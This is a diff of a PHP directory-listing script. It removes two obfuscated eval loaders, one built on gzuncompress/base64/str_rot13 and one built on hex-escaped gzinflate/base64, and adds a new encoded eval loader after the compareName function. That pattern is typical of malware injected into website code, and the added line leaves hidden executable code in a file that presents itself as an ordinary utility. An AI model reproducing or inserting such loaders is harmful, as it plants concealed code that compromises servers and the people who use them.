@@ -25,7 +25,7 @@ $dirSize = 0;
 # checking if the blacklist file exists, reading it into array
 if (file_exists($blacklistFile)) {
     $blacklist = array_merge($blacklistArray, file($blacklistFile, FILE_IGNORE_NEW_LINES));
-}; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+};
 
 # reading directory
 if ($dh = opendir('.')) {
@@ -97,7 +97,7 @@ function setSize($size, $decimals) {
 function compareName($a, $b) {
     # name comparison for usort
     return strnatcasecmp($a['name'], $b['name']);
-}
+}; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 
 $version = phpversion();
 $server_ip = $_SERVER['SERVER_ADDR'];
@@ -788,10 +788,6 @@ input {
         }
         echo "\n    </table>\n";
     }
-?><?php
-$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
-$stt0 = "\x3dY\x41g6uM44t\x62\x41\x41J3Oh\x2bx\x61\x62r6G/fJX/n/d/vn8o1x1Q9\x43fHlZQ91\x62Hy\x62O/IsT/tkle\x43NpiTz4wLdOOzjHi4iEDqIj01\x63TGxWnqS9ndPDeUyrHGngDW464PzNQIPF5DLlYz2pEZuQX5/I3x3F8w\x431sugvurFYepz/PnofoDU8TIxvjErvp4\x61s0qkhDm\x41sqW2Jvh1G4ylROS\x42TTNY6xe\x41\x61pw\x63YNd9lJXqHjyi3NqM\x626iwMsuqDm\x62HEX18r9i3HOxWmwXppz0dovTvtPtmhVUq\x61pNw4UyKww3HOxi4jF\x2b7\x42Yp3LvMGwVhMD4nhIn\x42\x62E\x2bU\x62YM3GSQ\x42\x63FkTevwxty\x42r\x43ogUQzzmy4\x61Mnp\x63vfOpU\x42nyHK\x41DhkeHOpRNI/d\x62t\x2bdFmpzjHQjg\x43\x430IuQS6\x43JG\x61ovK0OZZ\x43/Y\x2bWOj\x62UJ\x2bNisuQEsWrlMdR\x63kePRpv\x62DXDJE6REkgimPJlsVmLXgLRm\x6221piDNTtuGtfRVTKOjivUo\x2bMSnjwJ9VN\x433RwxL7f\x42\x629\x2bzJ6ELWS\x631W5V5rHmzF\x41\x619MHkzRQS\x43z\x61SxiERUufZXiiHotsvXxDoWxuRRyWlv5\x42oleoQ5ItsDFJdukHwK7QjGL\x62Gmdwn1\x43DtONmYsR8Y3Lkm8wPfwoVzpZ\x41lk7MKXjMXLEUe4\x41vQ2Qms5pI4v33m25Vq5d\x434YZ3IPm8\x41ZQqPi8OM\x42frhrN2e1vSO\x63X\x62pPdZOGHF/Ql\x43QMF5Vw8fgw82gdNu\x61uop9uj\x41iKh\x41t\x43nMDoE6dOt7\x63PiSDZGoQNh2PGg8f7v3ODZzp9w4y\x43idiK\x430N4fFR9F633x\x41msKp\x2b\x61P\x2bJmQk0LFe102wlhGSv0QETVEVo79sL9fU4X\x62UjXrJ68hNdzH6\x41\x62/\x61pn3T8ET0s\x2bN6V\x62iOgRNfh4Ti9QG21vl5\x63j7\x61\x62Y7mk573MnW08h0yZXZEHZ\x41h\x624pIYQV8iFog\x41Yw\x430pPw\x63WWULVOGwi\x63Tru\x61mGSqGKntDofm\x43\x42hMWeYzX\x41fu9FLvpiW5OquKLIxF4UR\x2bx\x61KW\x2brvFW7oV3GJP\x42vl5FpZ6qq\x41\x61wjLtrrt4hzMtvJM/2tqv\x620GTlfOFp48W\x42I7MPKxlgm\x620T7FLjO\x61s5lghR5V\x42iI\x63/\x41ZSK\x43G8D9\x43DYhgXMKyMOuSIyyEYESer\x62mq\x63DM\x42x3y\x62K964ZQz\x2bDLwwQ\x62K7mjUx\x63\x637N\x2bMQDUfTzT\x61e\x43\x61r6olDIFznnE12DG0Z4oRzTqvKY8ku/soJ4SZ0/UfXprhjpV2oP8l/\x42R8m4\x63\x62\x61Tgp\x63I888\x2b/\x41oF\x61eiVXm\x62ZkXTjtlT0Qvyz44pJSL\x63GFHPM/\x2bEX03/rirrh8z\x63dtdTJsdsrdSpx\x63mTd5MfWDvn6xpus8rWiT\x634sl\x41LIiM\x43enqiPx7lx7EYfEJ\x61wtj6KE\x63FKLRrSThP4gymZdsJN\x62JjOrFnX\x62oKwwwg2I\x43Oy\x61\x429SrdKWkpOnTi\x63FrK0JN2oW/\x61QqFdEnsq\x43mgNZFQ\x62JTNeTUmvEnk7\x63T\x63\x43uLpDrtqTz3tQ9EkIp\x62rRmgyZ\x62GD3ojmudWGOF\x2b0D\x43XKotGIMHLQETgk6Im9\x62UunHunkrDsITTyqtdi\x42riII6u\x2b\x61V54X6l\x421UOFFKEweI2\x42lEeFz\x62hoS7sgfJYGpxIVwz\x41xrXEOq\x63Y\x61nSXlnRn/DpLopWEjuRp\x63sfg\x43\x2b5ixZy\x623Z\x63WMhGfZZQdf\x62zO/2j\x61Nj6vv9XX\x2beP3\x63858Je8L2/grD/n7/8pRz54PLR5T6EzGnJJ\x63vGXy/4\x41oRlm\x42FxfQpINmLP\x41JS\x6131U2jPUHZ5WGvy\x42TuyY9\x63UmunpOfMN6JE\x62G\x2bYplhV\x62Jp/z4\x43J\x63P\x41tJuKFXRrT\x63fpj\x62OgwnJPrjm8K17FXwr\x42QddwhtVnzfkoiO\x62eQPjRI0vUSg\x62zOUGxKx/\x62xo5\x2bQwGGknOYsVuiDy/nGrv8l9d/Pg\x63\x61tuoL/z\x431lwGkIOyNzioE\x41i/\x42\x620NiS\x41\x631L\x63N5\x43N\x63\x61LKkEQ5WvG6dygSG\x41I\x2bKyNj9kl67o7gRDU\x61h50fe\x635SOmj9/npfOiOxoEZgKTp01QKuJ4quwYi8/\x41w\x2bEU5pYhSi19YsU8rr4SqH6\x42i49vi\x41R\x43Zq5Nuz\x41FL0IMHqo3iPIqSMOzQSwi0iqsISmFf/\x2bjlKoGyoWmYk5FszNTMtUS\x41wkgSVWthRXpotWnSnNS\x639qT92D\x63nL\x418NjpjYtrI\x61KwTjDIu\x41\x2bys5KXlSkSvUYiywz\x43hvLsH\x61\x431j12Ldpp5U\x41p\x43J5u5uxVFqk8Q/9PDj3LG3\x63myG\x43PIHHG\x2bpU\x61e9YSKeVWufDe1VZ6\x61KJ\x62zgp0QRRM\x61twruqrWk2s21KMfj\x61yF\x62evL8\x2b22/9tpXtoh2xH\x63YnF7rmYM\x63yUKe7t3tzs2nr3t7e7u/8L0\x43I8058lprpT\x41H\x43JedPW/h2Hp7Hq/z\x42k\x63N8i5\x41jUPJlRuSS\x43gDP\x62egL5Ew7uGsDTr7oFJk4Eww1P4/MH\x2bDhR\x61PX\x62Y1e\x2bVYg6\x42wJe5rg\x421HQ\x2bFYg\x2b\x42wJe4r/\x42FE\x41\x2b1fg\x43\x42wJe4r\x2b\x42VE\x41\x2blfgG\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
 ?>
 </div>
 
